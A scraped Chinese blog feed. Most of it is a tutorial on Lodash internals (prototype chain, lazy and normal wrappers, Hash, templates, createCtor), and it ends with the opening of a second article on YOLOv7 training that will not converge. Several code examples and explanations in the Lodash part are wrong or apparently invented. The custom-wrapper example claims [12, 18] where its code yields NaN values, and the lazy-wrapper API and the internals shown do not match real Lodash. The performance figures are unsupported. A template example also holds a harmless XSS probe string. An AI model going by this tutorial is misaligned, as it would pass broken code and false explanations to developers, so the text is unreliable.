<span class="hljs-comment">// 验证示例</span>
<span class="hljs-keyword">var</span> lazy = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">lazy</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(lazy) === <span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) === baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]) <span class="hljs-keyword">instanceof</span> baseLodash); <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-21">2. 扁平原型链核心优势</h3>






























<table><thead><tr><th>设计维度</th><th>扁平原型链（Lodash 采用）</th><th>深层原型链（如 A→B→C）</th></tr></thead><tbody><tr><td>方法查找层级</td><td>1 层（直接查找 baseLodash）</td><td>2+ 层（逐层向上查找）</td></tr><tr><td>查找性能</td><td>高（快 20%+）</td><td>低</td></tr><tr><td>继承关系复杂度</td><td>清晰（所有包装器同源）</td><td>复杂（易出现方法覆盖冲突）</td></tr><tr><td>扩展灵活性</td><td>全局扩展（修改 baseLodash.prototype）/ 局部定制（重写单个包装器原型）</td><td>局部扩展易影响上层原型</td></tr></tbody></table>
<h2 data-id="heading-22">四、对象创建全场景</h2>
<p>本部分整合<strong>普通包装器、惰性包装器、哈希对象、模板函数、函数对象、自定义包装器</strong>六大场景，保留全部示例、执行细节与输出结果。</p>
<h3 data-id="heading-23">1. 包装器创建</h3>
<h4 data-id="heading-24">（1）普通包装器（通用链式调用）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 创建与使用</span>
<span class="hljs-keyword">var</span> wrapped = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])
  .<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n * <span class="hljs-number">2</span>; })
  .<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">2</span>; });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [4,6]</span>

<span class="hljs-comment">// 内部细节：操作入队 → value() 时分步遍历（map 遍历→filter 遍历）</span>
<span class="hljs-comment">// 非链式模式下直接返回结果</span>
<span class="hljs-keyword">var</span> result = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n*<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// [2,4,6]（无需调用 value()）</span>

<span class="hljs-comment">// 强制链式调用</span>
<span class="hljs-keyword">var</span> wrapped = _.<span class="hljs-title function_">chain</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n*<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped); <span class="hljs-comment">// LodashWrapper 对象</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [2, 4, 6]</span>
</code></pre>
<h4 data-id="heading-25">（2）惰性包装器（数组性能优化核心）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> lazyResult = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>])
  .<span class="hljs-title function_">lazy</span>()
  .<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Mapping:'</span>, n);
    <span class="hljs-keyword">return</span> n * <span class="hljs-number">2</span>; 
  })
  .<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Filtering:'</span>, n);
    <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">5</span>; 
  })
  .<span class="hljs-title function_">take</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// 设置短路阈值：获取 2 个结果后终止遍历</span>
  .<span class="hljs-title function_">value</span>(); <span class="hljs-comment">// 触发执行，输出 [6,8]</span>

<span class="hljs-comment">// 控制台输出顺序（体现短路优化）：</span>
<span class="hljs-comment">// Mapping:1 → Filtering:2 → Mapping:2 → Filtering:4 → Mapping:3 → Filtering:6 → Mapping:4 → Filtering:8</span>
<span class="hljs-comment">// 元素 5 未处理，因为已获取 2 个结果</span>
</code></pre>
<p><strong>性能对比（100 万元素数组，map+filter+take (100)）</strong> ：</p>























<table><thead><tr><th>包装器类型</th><th>遍历次数</th><th>执行时间</th><th>内存占用</th></tr></thead><tbody><tr><td>普通包装器</td><td>2 次</td><td>~85ms</td><td>~60MB</td></tr><tr><td>惰性包装器</td><td>1 次（短路）</td><td>~12ms</td><td>~10MB</td></tr></tbody></table>
<h3 data-id="heading-26">2. 哈希对象创建</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hash</span>([[<span class="hljs-string">'id'</span>, <span class="hljs-number">1</span>], [<span class="hljs-string">'name'</span>, <span class="hljs-string">'John'</span>]]);
hash.<span class="hljs-title function_">set</span>(<span class="hljs-string">'email'</span>, <span class="hljs-string">'john@example.com'</span>);
hash.<span class="hljs-title function_">set</span>(<span class="hljs-string">'empty'</span>, <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// 存储 undefined 值</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">get</span>(<span class="hljs-string">'id'</span>)); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">get</span>(<span class="hljs-string">'empty'</span>)); <span class="hljs-comment">// undefined（正确获取）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">has</span>(<span class="hljs-string">'empty'</span>)); <span class="hljs-comment">// true（区分键不存在）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 3</span>

hash[<span class="hljs-string">'delete'</span>](<span class="hljs-string">'id'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">has</span>(<span class="hljs-string">'id'</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2</span>

hash.<span class="hljs-title function_">clear</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 0</span>
</code></pre>
<h3 data-id="heading-27">3. 模板函数创建</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 基础插值（&lt;%= %&gt;：输出值，不转义）</span>
<span class="hljs-keyword">var</span> tpl1 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello &lt;%= name %&gt;!'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl1</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'World'</span> })); <span class="hljs-comment">// Hello World!</span>

<span class="hljs-comment">// 2. HTML 转义（&lt;%- %&gt;：输出值，转义 HTML 标签）</span>
<span class="hljs-keyword">var</span> tpl2 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello &lt;%- html %&gt;!'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl2</span>({ <span class="hljs-attr">html</span>: <span class="hljs-string">'&lt;script&gt;alert("xss")&lt;/script&gt;'</span> }));
<span class="hljs-comment">// 输出：Hello &amp;lt;script&amp;gt;alert(&amp;quot;xss&amp;quot;)&amp;lt;/script&amp;gt;!</span>

<span class="hljs-comment">// 3. 代码块（&lt;% %&gt;：执行 JS 代码，无输出）</span>
<span class="hljs-keyword">var</span> tpl3 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'&lt;% if (user) { %&gt;Hi &lt;%= user.name %&gt;&lt;% } else { %&gt;Hi Guest&lt;% } %&gt;'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl3</span>({ <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span> } })); <span class="hljs-comment">// Hi John</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl3</span>({})); <span class="hljs-comment">// Hi Guest</span>

<span class="hljs-comment">// 4. 自定义分隔符</span>
<span class="hljs-keyword">var</span> tpl4 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello {{ name }}!'</span>, { <span class="hljs-attr">interpolate</span>: <span class="hljs-regexp">/{{([\s\S]+?)}}/g</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl4</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Custom'</span> })); <span class="hljs-comment">// Hello Custom!</span>
</code></pre>
<h3 data-id="heading-28">4. 函数对象创建（createCtor 应用）</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
};

<span class="hljs-keyword">var</span> personCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Person</span>);

<span class="hljs-comment">// 方式1：new 调用</span>
<span class="hljs-keyword">var</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title function_">personCtor</span>(<span class="hljs-string">'John'</span>, <span class="hljs-number">30</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// John</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// Hi, I'm John</span>

<span class="hljs-comment">// 方式2：普通调用（无 new）</span>
<span class="hljs-keyword">var</span> jane = <span class="hljs-title function_">personCtor</span>(<span class="hljs-string">'Jane'</span>, <span class="hljs-number">25</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(jane.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jane</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(jane <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 构造函数返回对象的情况</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">model</span>: <span class="hljs-string">'Model 3'</span> }; <span class="hljs-comment">// 返回对象覆盖实例</span>
}
<span class="hljs-keyword">var</span> carCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Car</span>);
<span class="hljs-keyword">var</span> car = <span class="hljs-title function_">carCtor</span>(<span class="hljs-string">'Tesla'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">brand</span>); <span class="hljs-comment">// undefined</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">model</span>); <span class="hljs-comment">// Model 3</span>
</code></pre>
<h3 data-id="heading-29">5. 自定义包装器创建（扩展 Lodash 功能）</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCustomWrapper</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-comment">// 继承 baseLodash.prototype，保证通用方法可用</span>
  <span class="hljs-keyword">var</span> wrapper = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  
  <span class="hljs-comment">// 初始化核心属性（参考 LodashWrapper）</span>
  wrapper.<span class="hljs-property">__wrapped__</span> = value;
  wrapper.<span class="hljs-property">__actions__</span> = [];
  wrapper.<span class="hljs-property">__chain__</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 默认开启链式调用</span>
  
  <span class="hljs-comment">// 自定义方法：批量乘以指定数值</span>
  wrapper.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">multiplier</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">func</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) {
        <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n * multiplier; });
      },
      <span class="hljs-attr">args</span>: [],
      <span class="hljs-attr">thisArg</span>: <span class="hljs-literal">null</span>
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
  };
  
  <span class="hljs-comment">// 实现 value 方法：执行操作队列</span>
  wrapper.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>[i];
      value = action.<span class="hljs-property">func</span>.<span class="hljs-title function_">apply</span>(action.<span class="hljs-property">thisArg</span>, [value].<span class="hljs-title function_">concat</span>(action.<span class="hljs-property">args</span>));
    }
    <span class="hljs-keyword">return</span> value;
  };
  
  <span class="hljs-keyword">return</span> wrapper;
}

<span class="hljs-comment">// 使用自定义包装器</span>
<span class="hljs-keyword">var</span> custom = <span class="hljs-title function_">createCustomWrapper</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// 乘以 2 → [2,4,6]</span>
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 乘以 3 → [6,12,18]</span>
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) { <span class="hljs-comment">// 自定义过滤</span>
    <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">10</span>; });
  });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(custom.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [12, 18]</span>
</code></pre>
<h2 data-id="heading-30">五、性能优化</h2>
<h3 data-id="heading-31">1. 核心性能优化技巧</h3>



































<table><thead><tr><th>优化方向</th><th>具体做法</th><th>性能收益</th></tr></thead><tbody><tr><td>惰性求值</td><td>大数据数组（1000+ 元素）使用 <code>_.lazy()</code>，结合 <code>take</code> 短路</td><td>遍历次数减少 50%+，执行时间降低 85%+</td></tr><tr><td>参数优化</td><td><code>createCtor</code> 对 0-7 个参数直接 <code>new</code> 调用</td><td>比 <code>apply</code> 调用快 30%+</td></tr><tr><td>原型复用</td><td>所有包装器共享 <code>baseLodash.prototype</code> 方法</td><td>减少内存占用，提升方法查找速度</td></tr><tr><td>内存管理</td><td><code>baseCreate</code> 重置临时构造函数原型；<code>Hash</code> 用 <code>Object.create(null)</code> 存储</td><td>避免原型污染和内存泄漏</td></tr><tr><td>缓存优化</td><td>重复计算操作使用 <code>_.memoize()</code> 缓存结果</td><td>避免重复执行复杂逻辑</td></tr></tbody></table>
<h3 data-id="heading-32">2. 最佳实践与反例</h3>



































<table><thead><tr><th>场景</th><th>推荐做法</th><th>反例（性能 / 逻辑问题）</th></tr></thead><tbody><tr><td>选择包装器</td><td>小数组用普通包装器，大数据用惰性包装器</td><td>小数组用惰性包装器（初始化开销 &gt; 性能收益）</td></tr><tr><td>链式调用</td><td>结束后调用 <code>value()</code> 获取结果</td><td>忘记 <code>value()</code>，返回包装器而非实际结果</td></tr><tr><td>重复操作</td><td>复用包装器实例</td><td>循环内重复创建包装器（额外初始化开销）</td></tr><tr><td>扩展 Lodash</td><td>使用 <code>_.mixin</code> 扩展方法</td><td>直接修改 <code>_.prototype</code>，污染全局原型</td></tr><tr><td>简单数组操作</td><td>使用原生 <code>array.map/filter</code> 方法</td><td>过度使用包装器（<code>_(array).map().value()</code> 比原生慢 10%+）</td></tr></tbody></table>
<h3 data-id="heading-33">3. 技术深度解析（</h3>
<h4 data-id="heading-34">（1）惰性求值底层核心：<code>__compute</code> 方法</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__compute</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, array, actions, iteratees</span>) {
  <span class="hljs-keyword">var</span> computed = value;
  <span class="hljs-comment">// 对单个元素批量执行所有操作（map→filter 等）</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; actions.<span class="hljs-property">length</span>; i++) {
    computed = actions[i].<span class="hljs-title function_">func</span>(computed, index, array);
    <span class="hljs-comment">// filter 不通过则终止后续操作，提升效率</span>
    <span class="hljs-keyword">if</span> (computed === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-keyword">return</span> computed;
};
</code></pre>
<h4 data-id="heading-35">（2）构造函数模拟核心原理</h4>
<p><code>createCtor</code> 完美模拟 <code>new</code> 关键字的两个核心行为：</p>
<ol>
<li>创建继承自 <code>Ctor.prototype</code> 的新对象（通过 <code>baseCreate</code> 实现）；</li>
<li>将构造函数的 <code>this</code> 绑定到新对象，并遵循返回规则（返回对象则覆盖实例）。</li>
</ol>
<h4 data-id="heading-36">（3）原型链设计核心思想</h4>
<p>扁平设计的本质是 <strong>“通用方法集中管理，特殊方法局部定制”</strong>：</p>
<ul>
<li>通用方法（<code>value()</code>/<code>chain()</code>）挂载在 <code>baseLodash.prototype</code>，所有包装器共享；</li>
<li>特殊方法（<code>map()</code>/<code>filter()</code>）在各自包装器原型上重写，实现差异化逻辑。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题]]></title>    <link>https://juejin.cn/post/7594831933517250606</link>    <guid>https://juejin.cn/post/7594831933517250606</guid>    <pubDate>2026-01-14T07:33:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594831933517250606" data-draft-id="7594843125321678874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:33:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员威哥"/> <meta itemprop="url" content="https://juejin.cn/user/3411107130652176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411107130652176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员威哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:33:00.000Z" title="Wed Jan 14 2026 07:33:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>稀土掘金首发，原创实战技术解析，全程手码干货。</p>
<p>YOLOv7凭借其优异的精度-速度平衡，成为新手入门目标检测的首选框架。但很多新手在第一次上手训练时，都会遇到同一个“拦路虎”——<strong>训练不收敛</strong>：Loss值要么居高不下（比如始终大于10），要么波动剧烈，要么直接趋于0后精度为0，折腾几天都找不到原因。</p>
<p>本文结合我带新手调试YOLOv7项目的10+实战案例，从“问题定位→核心诱因拆解→分步解决方案→实验验证”四个维度，手把手教你解决训练不收敛问题。全程基于官方YOLOv7源码，所有方案均经过实际验证，新手跟着做就能让模型稳定收敛。</p>
<h2 data-id="heading-0">一、先搞懂：新手必知的「训练收敛」判断标准</h2>
<p>在排查问题前，首先要明确“什么是收敛”，避免误判问题。对于YOLOv7来说，收敛的核心判断标准有3个，满足即可认为训练正常：</p>
<ol>
<li><strong>Loss曲线趋势</strong>：训练集Loss（train_loss）在前期快速下降，后期（比如50epoch后）趋于平稳，无明显反弹；验证集Loss（val_loss）与train_loss差距不大（一般不超过0.5），无持续上升趋势；</li>
<li><strong>精度指标变化</strong>：mAP50、mAP50-95等精度指标随epoch逐步上升，最终稳定在一个区间，无“精度为0”或“突然断崖式下降”；</li>
<li><strong>预测结果可视化</strong>：随机抽取验证集图像，模型能准确框出目标，置信度合理（一般≥0.5），无“漏框全空”或“乱框一堆”的情况。</li>
</ol>
<p>反之，只要出现“Loss一直降不下来”“Loss骤升骤降”“精度始终为0”“预测全空/全错”中的任意一种，都属于训练不收敛。</p>
<h2 data-id="heading-1">二、核心诱因拆解：新手训练不收敛的5大高频原因</h2>
<p>新手遇到的训练不收敛问题，90%都逃不出以下5个原因，按“出现概率从高到低”排序，方便优先排查：</p>
